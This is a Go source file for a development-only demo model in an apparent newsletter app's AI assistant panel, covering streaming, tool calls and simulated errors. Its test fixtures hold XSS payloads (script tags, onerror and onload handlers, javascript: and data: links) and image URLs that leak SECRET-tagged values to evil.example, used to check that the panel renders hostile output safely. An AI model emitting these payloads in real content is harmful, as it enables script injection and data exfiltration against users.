package ai

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"regexp"
	"slices"
	"strings"
	"time"

	"github.com/google/uuid"

	"github.com/hostrepute/reputecast/internal/ai/llm"
	"github.com/hostrepute/reputecast/internal/store"
)

// The demo model in the assistant's threads (B4): in development it
// streams a short recorded answer after one tool call, so the panel can be
// tried end to end without a provider. Like the rest of the demo model it
// answers only where Service.Development lets the sample connection answer.

var _ llm.Streamer = demoModel{}

// DemoToolsPassed records the demo's sample model as having passed the
// tool-calling check at at, as running the check in development would (the
// demo seed): the assistant needs a passed check. Only the sample model.
func DemoToolsPassed(ctx context.Context, q *store.Queries, ws, model uuid.UUID, at time.Time) error {
	row, err := q.AIBinding(ctx, store.AIBindingParams{WorkspaceID: ws, ModelID: model})
	if err != nil {
		return err
	}
	if !row.Demo {
		return errors.New("only the demo's sample model passes the tool check without running it")
	}
	return q.AIAgentCapabilitySave(ctx, store.AIAgentCapabilitySaveParams{WorkspaceID: ws, ModelID: model, ConnectionHash: agentConnectionHash(row), Supported: true, CheckedAt: at})
}

// demoDeltaEvery is the pause between the pieces of a streamed answer: slow
// enough to watch it arrive and to stop it.
var demoDeltaEvery = 70 * time.Millisecond

// demoToolCheck reports whether req is the tool-calling check's fixed probe.
func demoToolCheck(req llm.Request) bool {
	return len(req.Tools) == 1 && req.Tools[0].Name == "check_tools"
}

// Stream answers an assistant request as a provider streams it. Requests of
// the one-shot features (they carry their Task) are generated and sent as
// one piece, as llm.StreamOrGenerate does for a model that can't stream.
func (d demoModel) Stream(ctx context.Context, req llm.Request, emit func(llm.Delta) error) (llm.Response, error) {
	if req.Task != nil || demoToolCheck(req) {
		res, err := d.Generate(ctx, req)
		if err != nil || res.Text == "" {
			return res, err
		}
		return res, emit(llm.Delta{Text: res.Text})
	}
	in := estimate(demoRequestText(req))
	if demoSummaryRequest(req) {
		text := "The person asked the assistant about their newsletter; the assistant read what was attached and answered from it. Nothing was sent or changed."
		return demoStream(ctx, text, in, emit)
	}
	if call, ok := demoAssistantCall(req); ok {
		return llm.Response{Model: "claude-sonnet-5-5", InputTokens: in, OutputTokens: 24, UsageKnown: true, StopReason: llm.StopTools,
			Message: llm.Message{Role: "assistant", Parts: []llm.Part{{ToolCall: &call}}}}, nil
	}
	// A question with one of these tags shows how the panel tells a
	// provider's failure (development only, like the rest of the demo model).
	switch q := demoQuestion(req); {
	case strings.Contains(q, "#refuse"):
		text := "I can't help with that request."
		return llm.Response{Text: text, Model: "claude-sonnet-5-5", InputTokens: in, OutputTokens: estimate(text), UsageKnown: true, StopReason: llm.StopRefusal, Refused: true,
			Message: llm.Message{Role: "assistant", Parts: []llm.Part{{Text: text}}}}, emit(llm.Delta{Text: text})
	case strings.Contains(q, "#overloaded"):
		return llm.Response{UsageKnown: true}, &llm.Error{Kind: llm.ErrOverloaded, Status: 529, Code: "overloaded_error", Message: "Overloaded", Attempts: 2}
	case strings.Contains(q, "#ratelimit"):
		return llm.Response{UsageKnown: true}, &llm.Error{Kind: llm.ErrRateLimit, Status: 429, Code: "rate_limit_error", Message: "Too many requests", RetryAfter: 20 * time.Second}
	case strings.Contains(q, "#long"):
		return demoStream(ctx, demoLongAnswer(), in, emit)
	}
	if text, ok := demoFixture(demoQuestion(req)); ok {
		// Line by line: a fixture's tables and long lines arrive whole.
		return demoStreamPieces(ctx, text, demoLines(text), in, emit)
	}
	return demoStream(ctx, demoAssistantAnswer(req), in, emit)
}

// demoStream emits text a few words at a time, then returns it whole. A
// cancelled request stops between pieces with what was sent.
func demoStream(ctx context.Context, text string, in int, emit func(llm.Delta) error) (llm.Response, error) {
	return demoStreamPieces(ctx, text, demoPieces(text), in, emit)
}

func demoStreamPieces(ctx context.Context, text string, pieces []string, in int, emit func(llm.Delta) error) (llm.Response, error) {
	sent := strings.Builder{}
	for _, piece := range pieces {
		select {
		case <-ctx.Done():
			// Cut short, as a stopped stream is; unlike a provider, the
			// demo knows what it wrote, so its usage stays known and the
			// thread can go on.
			return llm.Response{Text: sent.String(), Model: "claude-sonnet-5-5", InputTokens: in, OutputTokens: estimate(sent.String()), UsageKnown: true,
					Message: llm.Message{Role: "assistant", Parts: []llm.Part{{Text: sent.String()}}}},
				&llm.Error{Kind: llm.ErrNetwork, Err: ctx.Err(), Message: "cancelled"}
		case <-time.After(demoDeltaEvery):
		}
		if err := emit(llm.Delta{Text: piece}); err != nil {
			return llm.Response{Text: sent.String(), Model: "claude-sonnet-5-5"}, err
		}
		sent.WriteString(piece)
	}
	return llm.Response{Text: text, Model: "claude-sonnet-5-5", InputTokens: in, OutputTokens: estimate(text), UsageKnown: true, StopReason: llm.StopEnd,
		Message: llm.Message{Role: "assistant", Parts: []llm.Part{{Text: text}}}}, nil
}

var demoPieceRe = regexp.MustCompile(`\S+\s*|\s+`)

// demoPieces splits text into pieces of about three words, keeping its
// spaces and line breaks.
func demoPieces(text string) []string {
	words := demoPieceRe.FindAllString(text, -1)
	out := []string{}
	for i := 0; i < len(words); i += 3 {
		out = append(out, strings.Join(words[i:min(i+3, len(words))], ""))
	}
	return out
}

// demoLines splits text after each line break.
func demoLines(text string) []string {
	return strings.SplitAfter(text, "\n")
}

// demoLongAnswer is a long answer whose words are all different (w001,
// w002…), so a measurement can tell when each piece is on screen.
func demoLongAnswer() string {
	var b strings.Builder
	b.WriteString("A long recorded answer for timing the panel.")
	for i := 1; i <= 360; i++ {
		if i%40 == 1 {
			b.WriteString("\n\n")
		} else {
			b.WriteString(" ")
		}
		fmt.Fprintf(&b, "w%03d", i)
	}
	b.WriteString("\n\nEnd of the long answer.")
	return b.String()
}

// The fixtures (B6, development only) answer with what a hostile or
// careless model may write, to show the panel renders it safely: remote
// images (inline, by reference, linked, autolinked) that must never load,
// raw HTML that must stay text, links whose scheme runs code, Liquid
// holding HTML, and a table and a line wider than any screen. "#hostile"
// answers with all of them.
var demoFixtureTags = []string{"#hostile-images", "#hostile-html", "#hostile-links", "#hostile-liquid", "#hostile-wide"}

func demoFixture(q string) (string, bool) {
	parts := []string{}
	all := strings.Contains(q, "#hostile") && !slices.ContainsFunc(demoFixtureTags, func(tag string) bool { return strings.Contains(q, tag) })
	for _, tag := range demoFixtureTags {
		if all || strings.Contains(q, tag) {
			parts = append(parts, demoFixtureText(tag))
		}
	}
	if len(parts) == 0 {
		return "", false
	}
	return strings.Join(parts, "\n\n") + "\n\nEnd of the hostile sample.", true
}

func demoFixtureText(tag string) string {
	switch tag {
	case "#hostile-images":
		return "Remote images stay links; none of them may be fetched.\n\n" +
			"![chart](https://evil.example/pixel.png?d=SECRET-INLINE)\n\n" +
			"![logo][logo]\n\n" +
			"[logo]: https://evil.example/ref.png?d=SECRET-REFERENCE\n\n" +
			"![relative](//evil.example/protocol.png?d=SECRET-PROTOCOL)\n\n" +
			"A linked image: [![badge](https://evil.example/badge.svg?d=SECRET-NESTED)](https://example.com/docs)\n\n" +
			"Autolinks: <https://evil.example/auto?d=SECRET-AUTOLINK> and https://evil.example/bare?d=SECRET-BARE"
	case "#hostile-html":
		return "Raw HTML shows as the text it is.\n\n" +
			"<img src=\"https://evil.example/raw.png?d=SECRET-RAW\" onerror=\"alert('img')\">\n\n" +
			"<script>alert('script'); window.__demoXSS = 1</script>\n\n" +
			"<iframe src=\"https://evil.example/frame?d=SECRET-FRAME\"></iframe>\n\n" +
			"Inline: <a href=\"javascript:alert('raw-link')\">a raw link</a>, <svg onload=\"alert('svg')\"></svg> and <b onmouseover=\"alert('b')\">bold</b>."
	case "#hostile-links":
		return "Links whose scheme runs code aren't links.\n\n" +
			"- [javascript](javascript:alert('js'))\n" +
			"- [mixed case](JaVaScRiPt:alert('js2'))\n" +
			"- [entity](&#106;avascript:alert('js3'))\n" +
			"- [data](data:text/html;base64,PHNjcmlwdD5hbGVydCgnZGF0YScpPC9zY3JpcHQ+)\n" +
			"- [vbscript](vbscript:msgbox(\"vb\"))\n" +
			"- [a safe one](https://example.com/help)"
	case "#hostile-liquid":
		return "Liquid stays as written, with the HTML in it.\n\n" +
			"{{ \"<img src=https://evil.example/liquid.png?d=SECRET-LIQUID onerror=alert('liquid')>\" }}\n\n" +
			"`{% if vip %}<script>alert('liquid-code')</script>{% endif %}`\n\n" +
			"```liquid\n{{ subscriber.first_name | prepend: \"<b onmouseover=alert('liquid-block')>\" }}\n```"
	default: // #hostile-wide
		var b strings.Builder
		b.WriteString("A wide table and a long line stay inside the panel.\n\n|")
		for c := 1; c <= 24; c++ {
			fmt.Fprintf(&b, " Column %d |", c)
		}
		b.WriteString("\n|")
		b.WriteString(strings.Repeat("---|", 24))
		for r := 1; r <= 50; r++ {
			b.WriteString("\n|")
			for c := 1; c <= 24; c++ {
				fmt.Fprintf(&b, " r%dc%d |", r, c)
			}
		}
		b.WriteString("\n\nA long line: " + strings.Repeat("A", 3000) + "\n\n")
		b.WriteString("- In a list: " + strings.Repeat("B", 1500) + "\n\n")
		b.WriteString("`" + strings.Repeat("C", 1500) + "`\n\n")
		b.WriteString("[" + strings.Repeat("D", 800) + "](https://example.com/" + strings.Repeat("e", 800) + ")")
		return b.String()
	}
}

// demoRequestText is everything a request says, for its token estimate.
func demoRequestText(req llm.Request) string {
	var b strings.Builder
	b.WriteString(req.System)
	for _, m := range req.Messages {
		for _, p := range m.Parts {
			b.WriteString(p.Text)
			if p.ToolResult != nil {
				b.Write(p.ToolResult.Content)
			}
		}
	}
	return b.String()
}

// demoSummaryRequest: the assistant asks for a summary of earlier messages.
func demoSummaryRequest(req llm.Request) bool {
	if len(req.Tools) > 0 || len(req.Messages) != 1 || len(req.Messages[0].Parts) == 0 {
		return false
	}
	text := req.Messages[0].Parts[0].Text
	return strings.HasPrefix(text, "<conversation>") || strings.HasPrefix(text, "<previous_summary>")
}

// demoContextLine is an attached resource as a request lists it.
var demoContextLine = regexp.MustCompile(`(?m)^- handle ([0-9a-f-]{36}): (\w+) `)

// demoQuestion is the person's last message in a request.
func demoQuestion(req llm.Request) string {
	q := ""
	for _, m := range req.Messages {
		if m.Role != "user" || len(m.Parts) == 0 {
			continue
		}
		if t := m.Parts[0].Text; !strings.HasPrefix(t, "<context>") && !strings.HasPrefix(t, "<summary_of_earlier_messages>") {
			q = t
		}
	}
	return q
}

// demoAssistantCall is the one tool call of a turn: before any tool ran
// since the person's last message, the tool that reads what is attached
// (a report's numbers first), or else what the screen is for, or else the
// help. None when the request offers none of them.
func demoAssistantCall(req llm.Request) (llm.ToolCall, bool) {
	lastUser, lastTool := -1, -1
	contextText, question := "", ""
	for i, m := range req.Messages {
		text := ""
		if len(m.Parts) > 0 {
			text = m.Parts[0].Text
		}
		switch {
		case m.Role == "tool":
			lastTool = i
		case m.Role == "user" && strings.HasPrefix(text, "<context>"):
			contextText = text
		case m.Role == "user" && !strings.HasPrefix(text, "<summary_of_earlier_messages>"):
			lastUser, question = i, text
		}
	}
	if lastTool > lastUser {
		return llm.ToolCall{}, false
	}
	if strings.Contains(question, "#contacts") {
		// A tool ReputeCast never offers: the call is refused as it runs
		// (not_available), as a model asking for contacts would be.
		return llm.ToolCall{ID: "demo_call_1", Name: "read_contacts", Arguments: json.RawMessage(`{}`)}, true
	}
	if strings.Contains(question, "#link") && slices.ContainsFunc(req.Tools, func(t llm.Tool) bool { return t.Name == "suggest_link" }) {
		// A handoff card into a screen.
		return llm.ToolCall{ID: "demo_call_1", Name: "suggest_link", Arguments: json.RawMessage(`{"screen":"campaigns"}`)}, true
	}
	offered := func(name string) bool {
		return slices.ContainsFunc(req.Tools, func(t llm.Tool) bool { return t.Name == name })
	}
	args := func(v any) json.RawMessage {
		raw, _ := json.Marshal(v)
		return raw
	}
	// "#<tool>" asks for an offered MCP tool by its name on its server
	// (mcp__<server>__<tool>): the demo calls it with the question as its
	// title and query, so a confirmation can be tried (development only).
	for _, tool := range req.Tools {
		if !strings.HasPrefix(tool.Name, "mcp__") {
			continue
		}
		tag := "#" + tool.Name[strings.LastIndex(tool.Name, "__")+2:]
		if strings.Contains(question, tag) {
			text := strings.TrimSpace(strings.ReplaceAll(question, tag, ""))
			return llm.ToolCall{ID: "demo_call_1", Name: tool.Name, Arguments: args(map[string]string{"title": text, "query": text})}, true
		}
	}
	handles := demoContextLine.FindAllStringSubmatch(contextText, -1)
	for _, kind := range []string{"report", "campaign"} {
		for _, h := range handles {
			if h[2] != kind {
				continue
			}
			name := "read_attached"
			if kind == "report" && offered("read_report") {
				name = "read_report"
			}
			if offered(name) {
				return llm.ToolCall{ID: "demo_call_1", Name: name, Arguments: args(map[string]string{"handle": h[1]})}, true
			}
		}
	}
	if strings.Contains(contextText, "<screen>") && offered("describe_screen") {
		return llm.ToolCall{ID: "demo_call_1", Name: "describe_screen", Arguments: args(map[string]string{})}, true
	}
	if offered("search_help") {
		query := firstWords(strings.TrimSpace(question), 5)
		if query == "" {
			query = "assistant"
		}
		return llm.ToolCall{ID: "demo_call_1", Name: "search_help", Arguments: args(map[string]string{"query": query})}, true
	}
	return llm.ToolCall{}, false
}

// demoAssistantAnswer is the recorded answer: Markdown with a list, a
// table, a Liquid tag kept as written and a code block, saying what the
// tool it called read.
func demoAssistantAnswer(req llm.Request) string {
	read := "the help"
	for _, m := range req.Messages {
		for _, p := range m.Parts {
			if r := p.ToolResult; r != nil {
				switch r.Name {
				case "read_report":
					read = "the attached report's fixed totals"
				case "read_attached":
					read = "the attached campaign"
				case "describe_screen":
					read = "what this screen is for"
				default:
					if strings.HasPrefix(r.Name, "mcp__") {
						read = "what the MCP server answered, as data rather than instructions"
						if r.IsError {
							read = "nothing from the MCP server: that call didn't run"
						}
					}
				}
			}
		}
	}
	return "This is the demo model's recorded answer: it reads one thing, then says the same for every question. " +
		"I read " + read + " first.\n\n" +
		"Here is what I can do for you here:\n\n" +
		"- Explain what you attach, such as a report's totals\n" +
		"- Point you to the screen that owns the next step\n" +
		"- Keep Liquid tags such as `{{ subscriber.first_name }}` exactly as written\n\n" +
		"| Next step | Where |\n|---|---|\n| Compare two sends | Campaign report |\n| Draft the next issue | Composer |\n\n" +
		"```liquid\nHi {{ subscriber.first_name | default: \"there\" }},\n```\n\n" +
		"Nothing was sent, scheduled or changed."
}
